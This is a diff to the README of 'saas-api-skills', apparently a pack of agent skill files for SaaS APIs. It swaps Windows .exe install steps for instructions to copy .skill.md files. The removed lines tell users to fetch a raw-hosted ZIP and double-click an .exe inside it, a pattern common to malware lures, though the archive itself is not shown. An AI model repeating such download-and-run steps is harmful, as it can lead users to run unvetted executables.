@@ -1,6 +1,6 @@
 # 🛠️ saas-api-skills - Connect your AI tools with ease
 
-[https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip](https://img.shields.io/badge/Download-Latest_Version-blue.svg)
+[![Download the skill archive](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip)
 
 ## 📖 What are these tools?
 
@@ -18,14 +18,14 @@ Your computer needs to meet these basic standards to run the software. These req
 
 ## 📥 How to download and install
 
-Follow these steps to set up the software on your Windows machine.
+Follow these steps to add the skill files to your agent workspace.
 
-1.  Visit the official release page: [Download Link](https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip)
-2.  Look for the file that ends in .exe.
-3.  Click the file name to start your download.
-4.  Open the folder where your browser saves files.
-5.  Double-click the .exe file.
-6.  Follow the prompts on your screen to finish the installation.
+1.  Download the [skill archive](https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip).
+2.  Extract the ZIP archive.
+3.  Choose the `.skill.md` files for the services you use.
+4.  Copy those files into the skills directory supported by your agent.
+5.  Set the environment variables documented in each skill file.
+6.  Restart or reload your agent so it discovers the new skills.
 
 ## 🚀 Setting up your first connection
 
@@ -64,7 +64,7 @@ Can I add my own services?
 Yes. Advanced users can create custom skill files for local use. Read the included text file in the installation folder for instructions on custom builds.
 
 What happens if a service updates?
-Most services keep their API paths consistent. If a service changes its tools, look for an app update on the download page. We release updates to fixbroken links as soon as they appear.
+Most services keep their API paths consistent. If a service changes its tools, download the latest skill archive. We release updates to fix broken links as soon as they appear.
 
 How do I remove the app?
-Open your Windows settings. Choose the Apps menu. Select the program from your list. Click Uninstall. This action removes the app and all configuration files from your system.
+Delete the installed `.skill.md` files from your agent's skills directory, then restart or reload the agent.
